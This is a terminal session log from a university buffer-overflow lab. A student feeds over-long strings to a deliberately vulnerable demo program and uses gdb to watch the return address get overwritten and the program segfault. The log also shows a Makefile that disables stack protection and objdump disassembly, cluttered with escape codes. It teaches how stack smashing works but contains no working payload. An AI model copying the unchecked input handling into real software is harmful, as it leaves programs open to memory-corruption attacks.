@@ -1,0 +1,327 @@
+Script started on Fri 30 Sep 2016 01:39:58 PM EDT
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ cat >de[K[K /dd[Kev/null
+1234
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ make asm
+objdump -d bufdemo > bufdemo.s
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ make asmcat > /dev/null
+gcc is allocating 16 bytes ino to each af rray of 4 characters.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ cat > /dev/null[7Pmake asmcat > /dev/null[5P./bufdemo 
+Enter a string: abcdefghijklmnopqrst
+ Abuf = 'qrst'
+ Bbuf = 'abcdefghijklmnopqrst'
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ cat > /dev/null
+The output is 'qrst' in b Abuf, because the string overflowed from Bbuf's beginning into af  Abuf after 16 bytes. Therefore, the last 4 bytes appear in Abuf.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ ./bufdemo 
+Enter a string: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
+ Abuf = 'qrstuvwxyzabcdefghijklmnopqrstuvwxyz'
+ Bbuf = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz'
+Segmentation fault (core dumped)
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ cat >/[K /dev/null
+The output is a segfault, beecaus  =    cause a longer string than the allocated 16  32 bytes was provided. Specifically, the return address was overrwritten to r get bec  ack to main, cause   ing th erp    e program to jump to an invl alid address when returning.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ gdb bufdemo 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bufdemo...done.
+(gdb) b *0x4005b0
+Breakpoint 1 at 0x4005b0: file bufdemo.c, line 14.
+(gdb) r
+Starting program: /home/taba238/CS485G/Lab4/bufdemo/bufdemo/bufdemo 
+Enter a string: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrst
+ Abuf = 'qrstuvwxyzabcdefghijklmnopqrst'
+ Bbuf = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrst'
+
+Breakpoint 1, 0x00000000004005b0 in echo () at bufdemo.c:14
+14	} // echo()
+(gdb) nexti[K[K[K[K[Kstepi
+0x000074737271706f in ?? ()
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) n
+Program not restarted.
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 11493] will be killed.
+
+Quit anyway? (y or n) y
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ cat ?gdb bufdemo cat > /dev/null
+The echo procedure does not retru  urn to main. This is because the string exceeded the allocated space on the stack for it, and ovver   erwrote the return address field, causing the program to jump to a nonexistent (or invalid) address.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ make GOAL=oflow_echo
+make: Nothing to be done for `all'.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ make GOAL=oflow_echo
+make: Nothing to be done for `all'.
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ gdb [K[K[K[Koflow[K[K[K[K[Kgdb oflow_echo 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from oflow_echo...done.
+(gdb) b *0x40061c
+Breakpoint 1 at 0x40061c: file oflow_echo.c, line 23.
+(gdb) r
+Starting program: /home/taba238/CS485G/Lab4/bufdemo/bufdemo/oflow_echo 
+aaaaaaaaaaaaaaaaaaaaaaaaa
+
+Breakpoint 1, 0x000000000040061c in mygets (
+    dest=0x7fffffffe4c0 'a' <repeats 25 times>) at oflow_echo.c:23
+23	} // mygets
+(gdb) stepi
+echo () at oflow_echo.c:30
+30	  puts(buf);
+(gdb) nexti
+0x0000000000400635	30	  puts(buf);
+(gdb) nexti
+0x0000000000400638	30	  puts(buf);
+(gdb) nexti
+aaaaaaaaaaaaaaaaaaaaaaaaa
+31	} // echo
+(gdb) n[Kstepi
+0x000000000040063e	31	} // echo
+(gdb) nexti[K[K[K[K[Ks[Ken[K[Knexti
+0x0000000000400061 in ?? ()
+(gdb) n[Kstepi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400061 in ?? ()
+(gdb) b *0v[K[K0x400061
+Breakpoint 2 at 0x400061
+(gdb) info b
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep y   0x000000000040061c in mygets at oflow_echo.c:23
+	breakpoint already hit 1 time
+2       breakpoint     keep y   0x0000000000400061 
+(gdb) re[K[Kdelete 1
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/taba238/CS485G/Lab4/bufdemo/bufdemo/oflow_echo 
+a  aaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000616161 in ?? ()
+(gdb) stepi
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) q
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ ls
+[0m[01;32mbufdemo[0m    bufdemo.s  Makefile    oflow_echo.c
+bufdemo.c  [01;32mhex2raw[0m    [01;32moflow_echo[0m  typescript
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ vi [K[K[Kvi Makefile 
+[?1049h[?1h=[2;1H▽[6n[1;1H  [1;1H[1;45r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[45;1H"Makefile" 12L, 173C[>c[1;1H[34m# Makefile for lab4[m
+
+[36mGOAL [m= bufdemo
+[36mCFLAGS [m= -Wall -g -O0 -fno-stack-protector
+
+[36mall:[m [36m$(GOAL)
+
+asm:[m [36m$(GOAL)[m
+[31m        objdump -d [m[36m$(GOAL)[m[31m > [m[36m$(GOAL)[m[31m.s[m
+
+[36mclean: [m
+[31m        rm -f [m[36m$(GOAL)[m[31m [m[36m$(GOAL)[m[31m.s[m
+[94m~                                                                                    [14;1H~                                                                                    [15;1H~                                                                                    [16;1H~                                                                                    [17;1H~                                                                                    [18;1H~                                                                                    [19;1H~                                                                                    [20;1H~                                                                                    [21;1H~                                                                                    [22;1H~                                                                                    [23;1H~                                                                                    [24;1H~                                                                                    [25;1H~                                                                                    [26;1H~                                                                                    [27;1H~                                                                                    [28;1H~                                                                                    [29;1H~                                                                                    [30;1H~                                                                                    [31;1H~                                                                                    [32;1H~                                                                                    [33;1H~                                                                                    [34;1H~                                                                                    [35;1H~                                                                                    [36;1H~                                                                                    [37;1H~                                                                                    [38;1H~                                                                                    [39;1H~                                                                                    [40;1H~                                                                                    [41;1H~                                                                                    [42;1H~                                                                                    [43;1H~                                                                                    [44;1H~                                                                                    [m[45;68H1,1[11CAll[1;1H[?12l[?25h[?25l[45;1H[K[45;1H:[?12l[?25hq[?25l[?12l[?25h[?25l[45;1H[K[45;1H[?1l>[?12l[?25h[?1049l]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ objdump -d oflow_echo > oflow_echo.s
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ vi Of[K[K[K oflow_echo.s
+[?1049h[?1h=[2;1H▽[6n[1;1H  [1;1H[1;45r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[45;1H"oflow_echo.s" 238L, 10967C[>c[2;1H[36moflow_echo[m:     [36mfile[m [36mformat[m [36melf64[m-[36mx86[m-[31m64[m
+
+
+[36mDisassembly[m [36mof[m [36msection[m [38;5;130m.init[m:
+
+[31m0000000000400450[m <[36m_init[m>:
+  [31m400450[m:[7C[31m48[m [31m83[m [36mec[m 0[31m8[m[13C[36msub[m    $[31m0x8[m,%[36mrsp[m
+  [31m400454[m:[7C[31m48[m [31m8[m[36mb[m [31m05 9[m[36md[m [31m0b[m [31m20[m [31m00 [m   [36mmov[m    [31m0x200b9d[m(%[36mrip[m),%[36mrax[m[8C[34m# 600ff8 <__[10;1HDYNAMIC+0x1d0>[m
+  [31m40045[m[36mb[m:[7C[31m48[m [31m85[m [36mc0[16Ctest[m   %[36mrax[m,%[36mrax[m
+  [31m40045[m[36me[m:[7C[31m74[m [31m05 [m[18C[36mje[m     [31m400465[m <[36m_init[m+[31m0x15[m>
+  [31m400460[m:[7C[36me8[m [31m4[m[36mb[m [31m00 00 00 [m[9C[36mcallq[m  [31m4004[m[36mb0[m <[36m__gmon_start__[m@[36mplt[m>
+  [31m400465[m:[7C[31m48[m [31m83[m [36mc4[m 0[31m8[m[13C[36madd[m    $[31m0x8[m,%[36mrsp[m
+  [31m400469[m:[7C[36mc3[22Cretq
+
+Disassembly[m [36mof[m [36msection[m [38;5;130m.plt[m:
+
+[31m0000000000400470[m <[36mputs[m@[36mplt[m-[31m0x10[m>:
+  [31m400470[m:[7C[36mff[m [31m35[m [31m92[m [31m0b[m [31m20[m [31m00 [m      [36mpushq[m  [31m0x200b92[m(%[36mrip[m)[8C[34m# 601008 <_GLOBAA[21;1HL_OFFSET_TABLE_+0x8>[m
+  [31m400476[m:[7C[36mff[m [31m25[m [31m94[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b94[m(%[36mrip[m)[8C[34m# 601010 <_GLOBB[23;1HAL_OFFSET_TABLE_+0x10>[m
+  [31m40047[m[36mc[m:[7C0[36mf[m [31m1[m[36mf[m [31m40[m [31m00 [m[12C[36mnopl[m   [31m0x0[m(%[36mrax[m)
+
+[31m0000000000400480[m <[36mputs[m@[36mplt[m>:
+  [31m400480[m:[7C[36mff[m [31m25[m [31m92[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b92[m(%[36mrip[m)[8C[34m# 601018 <_GLOBB[28;1HAL_OFFSET_TABLE_+0x18>[m
+  [31m400486[m:[7C[31m68[m [31m00 00 00 00 [m[9C[36mpushq[m  $[31m0x0
+[m  [31m40048[m[36mb[m:[7C[36me9[m [36me0[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400470[m <[36m_init[m+[31m0x20[m>
+
+[31m0000000000400490[m <[36m__libc_start_main[m@[36mplt[m>:
+  [31m400490[m:[7C[36mff[m [31m25[m [31m8[m[36ma[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b8a[m(%[36mrip[m)[8C[34m# 601020 <_GLOBB[34;1HAL_OFFSET_TABLE_+0x20>[m
+  [31m400496[m:[7C[31m68[m [31m01 00 00 00 [m[9C[36mpushq[m  $[31m0x1
+[m  [31m40049[m[36mb[m:[7C[36me9[m [36md0[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400470[m <[36m_init[m+[31m0x20[m>
+
+[31m00000000004004[m[36ma0[m <[36mgetchar[m@[36mplt[m>:
+  [31m4004[m[36ma0[m:[7C[36mff[m [31m25[m [31m82[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b82[m(%[36mrip[m)[8C[34m# 601028 <_GLOBB[40;1HAL_OFFSET_TABLE_+0x28>[m
+  [31m4004[m[36ma6[m:[7C[31m68[m [31m02 00 00 00 [m[9C[36mpushq[m  $[31m0x2
+[m  [31m4004[m[36mab[m:[7C[36me9[m [36mc0[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400470[m <[36m_init[m+[31m0x20[m>
+
+[31m00000000004004[m[36mb0[m <[36m__gmon_start__[m@[36mplt[m>:[45;68H1,0-1[9CTop[1;1H[?12l[?25h[?25l[45;68H3[3;1H[?12l[?25h[?25l[45;68H6[6;1H[?12l[?25h[?25l[45;68H15,0-1[16;1H[?12l[?25h[?25l[45;69H7[18;1H[?12l[?25h[?25l[45;68H22[25;1H[?12l[?25h[?25l[45;69H7[31;1H[?12l[?25h[?25l[45;68H32[37;1H[?12l[?25h[?25l[45;69H7[43;1H[?12l[?25h[?25l[1;44r[1;1H[5M[1;45r[40;3H[31m4004[m[36mb0[m:[7C[36mff[m [31m25[m [31m7[m[36ma[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b7a[m(%[36mrip[m)[8C[34m# 601030 <_GLOBB[41;1HAL_OFFSET_TABLE_+0x30>[m
+  [31m4004[m[36mb6[m:[7C[31m68[m [31m03 00 00 00 [m[9C[36mpushq[m  $[31m0x3
+[m  [31m4004[m[36mbb[m:[7C[36me9[m [36mb0[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400470[m <[36m_init[m+[31m0x20[m>[45;1H[K[45;68H42,0-1[9C2%[44;1H[?12l[?25h[?25l[1;44r[1;1H[6M[1;45r[39;1H[31m00000000004004[m[36mc0[m <[36mexit[m@[36mplt[m>:
+  [31m4004[m[36mc0[m:[7C[36mff[m [31m25[m [31m72[m [31m0b[m [31m20[m [31m00 [m      [36mjmpq[m   *[31m0x200b72[m(%[36mrip[m)[8C[34m# 601038 <_GLOBB[41;1HAL_OFFSET_TABLE_+0x38>[m
+  [31m4004[m[36mc6[m:[7C[31m68[m [31m04 00 00 00 [m[9C[36mpushq[m  $[31m0x4
+[m  [31m4004[m[36mcb[m:[7C[36me9[m [36ma0[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400470[m <[36m_init[m+[31m0x20[m>[45;68H[K[45;68H47,0-1[9C4%[44;1H[?12l[?25h[?25l[1;44r[1;1H[2M[1;45r[43;1H[36mDisassembly[m [36mof[m [36msection[m [38;5;130m.text[m:[45;68H[K[45;68H49,0-1[9C5%[44;1H[?12l[?25h[?25l[1;44r[1;1H[15M[1;45r[30;1H[31m00000000004004[m[36md0[m <[36m_start[m>:
+  [31m4004[m[36md0[m:[7C[31m31[m [36med[19Cxor[m    %[36mebp[m,%[36mebp[m
+  [31m4004[m[36md2[m:[7C[31m49[m [31m89[m [36md1[16Cmov[m    %[36mrdx[m,%[36mr9[m
+  [31m4004[m[36md5[m:[7C[31m5[m[36me[22Cpop[m    %[36mrsi[m
+  [31m4004[m[36md6[m:[7C[31m48[m [31m89[m [36me2[16Cmov[m    %[36mrsp[m,%[36mrdx[m
+  [31m4004[m[36md9[m:[7C[31m48[m [31m83[m [36me4[m [36mf0[13Cand[m    $[31m0xfffffffffffffff0[m,%[36mrsp[m
+  [31m4004[m[36mdd[m:[7C[31m50[m[22C[36mpush[m   %[36mrax[m
+  [31m4004[m[36mde[m:[7C[31m54[m[22C[36mpush[m   %[36mrsp[m
+  [31m4004[m[36mdf[m:[7C[31m49[m [36mc7[m [36mc0[m [36me0[m [31m06 40[m [31m00 [m   [36mmov[m    $[31m0x4006e0[m,%[36mr8[m
+  [31m4004[m[36me6[m:[7C[31m48[m [36mc7[m [36mc1[m [31m70[m [31m06 40[m [31m00 [m   [36mmov[m    $[31m0x400670[m,%[36mrcx[m
+  [31m4004[m[36med[m:[7C[31m48[m [36mc7[m [36mc7[m [36mbd[m [31m05 40[m [31m00 [m   [36mmov[m    $[31m0x4005bd[m,%[36mrdi[m
+  [31m4004[m[36mf4[m:[7C[36me8[m [31m97[m [36mff[m [36mff[m [36mff[10Ccallq[m  [31m400490[m <[36m__libc_start_main[m@[36mplt[m>
+  [31m4004[m[36mf9[m:[7C[36mf4[22Chlt[m
+  [31m4004[m[36mfa[m:[7C[31m66[m 0[36mf[m [31m1[m[36mf[m [31m44[m [31m00 00 [m      [36mnopw[m   [31m0x0[m(%[36mrax[m,%[36mrax[m,[31m1[m)[45;68H[K[45;68H64,0-1[8C12%[44;1H[?12l[?25h[?25l[1;44r[1;1H[18M[1;45r[27;1H[31m0000000000400500[m <[36mderegister_tm_clones[m>:
+  [31m400500[m:[7C[36mb8[m [31m57[m [31m10[m [31m60[m [31m00 [m[9C[36mmov[m    $[31m0x601057[m,%[36meax[m
+  [31m400505[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m400506[m:[7C[31m48[m [31m2[m[36md[m [31m50[m [31m10[m [31m60[m [31m00 [m      [36msub[m    $[31m0x601050[m,%[36mrax[m
+  [31m40050[m[36mc[m:[7C[31m48[m [31m83[m [36mf8[m 0[36me[13Ccmp[m    $[31m0xe[m,%[36mrax[m
+  [31m400510[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m400513[m:[7C[31m77[m [31m02 [m[18C[36mja[m     [31m400517[m <[36mderegister_tm_clones[m+[31m0x17[m>
+  [31m400515[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m400516[m:[7C[36mc3[22Cretq[m
+  [31m400517[m:[7C[36mb8[m [31m00 00 00 00 [m[9C[36mmov[m    $[31m0x0[m,%[36meax[m
+  [31m40051[m[36mc[m:[7C[31m48[m [31m85[m [36mc0[16Ctest[m   %[36mrax[m,%[36mrax[m
+  [31m40051[m[36mf[m:[7C[31m74[m [36mf4[19Cje[m     [31m400515[m <[36mderegister_tm_clones[m+[31m0x15[m>
+  [31m400521[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m400522[m:[7C[36mbf[m [31m50[m [31m10[m [31m60[m [31m00 [m[9C[36mmov[m    $[31m0x601050[m,%[36medi[m
+  [31m400527[m:[7C[36mff[m [36me0[19Cjmpq[m   *%[36mrax[m
+  [31m400529[m:[7C0[36mf[m [31m1[m[36mf[m [31m80[m [31m00 00 00 00 [m   [36mnopl[m   [31m0x0[m(%[36mrax[m)
+
+[31m0000000000400530[m <[36mregister_tm_clones[m>:[45;68H[K[45;68H81,0-1[8C20%[43;1H[?12l[?25h[?25l[1;44r[1;1H[21M[1;45r[24;3H[31m400530[m:[7C[36mb8[m [31m50[m [31m10[m [31m60[m [31m00 [m[9C[36mmov[m    $[31m0x601050[m,%[36meax[m
+  [31m400535[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m400536[m:[7C[31m48[m [31m2[m[36md[m [31m50[m [31m10[m [31m60[m [31m00 [m      [36msub[m    $[31m0x601050[m,%[36mrax[m
+  [31m40053[m[36mc[m:[7C[31m48[m [36mc1[m [36mf8[m [31m03 [m[12C[36msar[m    $[31m0x3[m,%[36mrax[m
+  [31m400540[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m400543[m:[7C[31m48[m [31m89[m [36mc2[16Cmov[m    %[36mrax[m,%[36mrdx[m
+  [31m400546[m:[7C[31m48[m [36mc1[m [36mea[m [31m3[m[36mf[13Cshr[m    $[31m0x3f[m,%[36mrdx[m
+  [31m40054[m[36ma[m:[7C[31m48[m [31m01 [m[36md0[16Cadd[m    %[36mrdx[m,%[36mrax[m
+  [31m40054[m[36md[m:[7C[31m48[m [36md1[m [36mf8[16Csar[m    %[36mrax[m
+  [31m400550[m:[7C[31m75[m [31m02 [m[18C[36mjne[m    [31m400554[m <[36mregister_tm_clones[m+[31m0x24[m>
+  [31m400552[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m400553[m:[7C[36mc3[22Cretq[m
+  [31m400554[m:[7C[36mba[m [31m00 00 00 00 [m[9C[36mmov[m    $[31m0x0[m,%[36medx[m
+  [31m400559[m:[7C[31m48[m [31m85[m [36md2[16Ctest[m   %[36mrdx[m,%[36mrdx[m
+  [31m40055[m[36mc[m:[7C[31m74[m [36mf4[19Cje[m     [31m400552[m <[36mregister_tm_clones[m+[31m0x22[m>
+  [31m40055[m[36me[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m40055[m[36mf[m:[7C[31m48[m [31m89[m [36mc6[16Cmov[m    %[36mrax[m,%[36mrsi[m
+  [31m400562[m:[7C[36mbf[m [31m50[m [31m10[m [31m60[m [31m00 [m[9C[36mmov[m    $[31m0x601050[m,%[36medi[m
+  [31m400567[m:[7C[36mff[m [36me2[19Cjmpq[m   *%[36mrdx[m
+  [31m400569[m:[7C0[36mf[m [31m1[m[36mf[m [31m80[m [31m00 00 00 00 [m   [36mnopl[m   [31m0x0[m(%[36mrax[m)[45;68H[K[45;68H103,0-1[7C30%[44;1H[?12l[?25h[?25l[1;44r[1;1H[13M[1;45r[32;1H[31m0000000000400570[m <[36m__do_global_dtors_aux[m>:
+  [31m400570[m:[7C[31m80[m [31m3[m[36md[m [36md9[m 0[36ma[m [31m20[m [31m00 00 [m   [36mcmpb[m   $[31m0x0[m,[31m0x200ad9[m(%[36mrip[m)[8C[34m# 601050 <__[34;1H_TMC_END__>[m
+  [31m400577[m:[7C[31m75[m [31m11[m[19C[36mjne[m    [31m40058[m[36ma[m <[36m__do_global_dtors_aux[m+[31m0x1a[m>
+  [31m400579[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m40057[m[36ma[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m40057[m[36md[m:[7C[36me8[m [31m7[m[36me[m [36mff[m [36mff[m [36mff[10Ccallq[m  [31m400500[m <[36mderegister_tm_clones[m>
+  [31m400582[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m400583[m:[7C[36mc6[m [31m05 [m[36mc6[m 0[36ma[m [31m20[m [31m00 01 [m   [36mmovb[m   $[31m0x1[m,[31m0x200ac6[m(%[36mrip[m)[8C[34m# 601050 <__[41;1H_TMC_END__>[m
+  [31m40058[m[36ma[m:[7C[36mf3[m [36mc3[19Crepz[m [36mretq[m
+  [31m40058[m[36mc[m:[7C0[36mf[m [31m1[m[36mf[m [31m40[m [31m00 [m[12C[36mnopl[m   [31m0x0[m(%[36mrax[m)[45;68H[K[45;68H114,0-1[7C36%[44;1H[?12l[?25h[?25l[1;44r[1;1H[17M[1;45r[28;1H[31m0000000000400590[m <[36mframe_dummy[m>:
+  [31m400590[m:[7C[31m48[m [31m83[m [31m3[m[36md[m [31m88[m 0[31m8[m [31m20[m [31m00 [m   [36mcmpq[m   $[31m0x0[m,[31m0x200888[m(%[36mrip[m)[8C[34m# 600e20 <__[30;1H_JCR_END__>[m
+  [31m400597[m:[7C[31m00 
+[m  [31m400598[m:[7C[31m74[m [31m1[m[36me[19Cje[m     [31m4005[m[36mb8[m <[36mframe_dummy[m+[31m0x28[m>
+  [31m40059[m[36ma[m:[7C[36mb8[m [31m00 00 00 00 [m[9C[36mmov[m    $[31m0x0[m,%[36meax[m
+  [31m40059[m[36mf[m:[7C[31m48[m [31m85[m [36mc0[16Ctest[m   %[36mrax[m,%[36mrax[m
+  [31m4005[m[36ma2[m:[7C[31m74[m [31m14[m[19C[36mje[m     [31m4005[m[36mb8[m <[36mframe_dummy[m+[31m0x28[m>
+  [31m4005[m[36ma4[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m4005[m[36ma5[m:[7C[36mbf[m [31m20[m 0[36me[m [31m60[m [31m00 [m[9C[36mmov[m    $[31m0x600e20[m,%[36medi[m
+  [31m4005[m[36maa[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m4005[m[36mad[m:[7C[36mff[m [36md0[19Ccallq[m  *%[36mrax[m
+  [31m4005[m[36maf[m:[7C[31m5[m[36md[22Cpop[m    %[36mrbp[m
+  [31m4005[m[36mb0[m:[7C[36me9[m [31m7[m[36mb[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400530[m <[36mregister_tm_clones[m>
+  [31m4005[m[36mb5[m:[7C0[36mf[m [31m1[m[36mf[m [31m00 [m[15C[36mnopl[m   (%[36mrax[m)
+  [31m4005[m[36mb8[m:[7C[36me9[m [31m73[m [36mff[m [36mff[m [36mff[10Cjmpq[m   [31m400530[m <[36mregister_tm_clones[m>[45;68H[K[45;68H130,0-1[7C45%[44;1H[?12l[?25h[?25l[1;44r[1;1H[7M[1;45r[38;1H[31m00000000004005[m[36mbd[m <[36mmain[m>:
+  [31m4005[m[36mbd[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m4005[m[36mbe[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m4005[m[36mc1[m:[7C[36mb8[m [31m00 00 00 00 [m[9C[36mmov[m    $[31m0x0[m,%[36meax[m
+  [31m4005[m[36mc6[m:[7C[36me8[m [31m52[m [31m00 00 00 [m[9C[36mcallq[m  [31m40061[m[36md[m <[36mecho[m>
+  [31m4005[m[36mcb[m:[7C[36meb[m [36mf4[19Cjmp[m    [31m4005[m[36mc1[m <[36mmain[m+[31m0x4[m>[45;68H[K[45;68H137,0-1[7C48%[44;1H[?12l[?25h[?25l[27m[m[H[2J[1;3H[31m4005[m[36md9[m:[7C[36me8[m [36mc2[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m4004[m[36ma0[m <[36mgetchar[m@[36mplt[m>
+  [31m4005[m[36mde[m:[7C[31m89[m [31m45[m [36mfc[16Cmov[m    %[36meax[m,-[31m0x4[m(%[36mrbp[m)
+  [31m4005[m[36me1[m:[7C[31m48[m [31m8[m[36mb[m [31m45[m [36me8[13Cmov[m    -[31m0x18[m(%[36mrbp[m),%[36mrax[m
+  [31m4005[m[36me5[m:[7C[31m48[m [31m89[m [31m45[m [36mf0[13Cmov[m    %[36mrax[m,-[31m0x10[m(%[36mrbp[m)
+  [31m4005[m[36me9[m:[7C[36meb[m [31m19[m[19C[36mjmp[m    [31m400604[m <[36mmygets[m+[31m0x37[m>
+  [31m4005[m[36meb[m:[7C[31m48[m [31m8[m[36mb[m [31m45[m [36mf0[13Cmov[m    -[31m0x10[m(%[36mrbp[m),%[36mrax[m
+  [31m4005[m[36mef[m:[7C[31m48[m [31m8[m[36md[m [31m50[m [31m01 [m[12C[36mlea[m    [31m0x1[m(%[36mrax[m),%[36mrdx[m
+  [31m4005[m[36mf3[m:[7C[31m48[m [31m89[m [31m55[m [36mf0[13Cmov[m    %[36mrdx[m,-[31m0x10[m(%[36mrbp[m)
+  [31m4005[m[36mf7[m:[7C[31m8[m[36mb[m [31m55[m [36mfc[16Cmov[m    -[31m0x4[m(%[36mrbp[m),%[36medx[m
+  [31m4005[m[36mfa[m:[7C[31m88[m [31m10[m[19C[36mmov[m    %[36mdl[m,(%[36mrax[m)
+  [31m4005[m[36mfc[m:[7C[36me8[m [31m9[m[36mf[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m4004[m[36ma0[m <[36mgetchar[m@[36mplt[m>
+  [31m400601[m:[7C[31m89[m [31m45[m [36mfc[16Cmov[m    %[36meax[m,-[31m0x4[m(%[36mrbp[m)
+  [31m400604[m:[7C[31m83[m [31m7[m[36md[m [36mfc[m [36mff[13Ccmpl[m   $[31m0xffffffff[m,-[31m0x4[m(%[36mrbp[m)
+  [31m400608[m:[7C[31m74[m [31m06 [m[18C[36mje[m     [31m400610[m <[36mmygets[m+[31m0x43[m>
+  [31m40060[m[36ma[m:[7C[31m83[m [31m7[m[36md[m [36mfc[m 0[36ma[13Ccmpl[m   $[31m0xa[m,-[31m0x4[m(%[36mrbp[m)
+  [31m40060[m[36me[m:[7C[31m75[m [36mdb[19Cjne[m    [31m4005[m[36meb[m <[36mmygets[m+[31m0x1e[m>
+  [31m400610[m:[7C[31m48[m [31m8[m[36mb[m [31m45[m [36mf0[13Cmov[m    -[31m0x10[m(%[36mrbp[m),%[36mrax[m
+  [31m400614[m:[7C[36mc6[m [31m00 00 [m[15C[36mmovb[m   $[31m0x0[m,(%[36mrax[m)
